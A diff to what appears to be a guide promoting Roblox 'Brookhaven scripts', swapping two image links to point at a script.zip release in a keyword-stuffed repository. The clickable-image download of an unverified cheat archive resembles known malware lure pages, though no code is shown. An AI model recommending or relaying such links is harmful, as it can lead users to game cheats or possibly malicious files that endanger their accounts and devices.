@@ -5,10 +5,10 @@
 In this in-depth guide, we’ll explore everything you need to know about Brookhaven scripts in 2025 — including features, how to use them, where to download safely, and what you should avoid to protect your Roblox account.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 [![hq720](https://github.com/user-attachments/assets/5c5a80c3-86f2-4e13-9b4b-a31e499133d1)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 ---
 
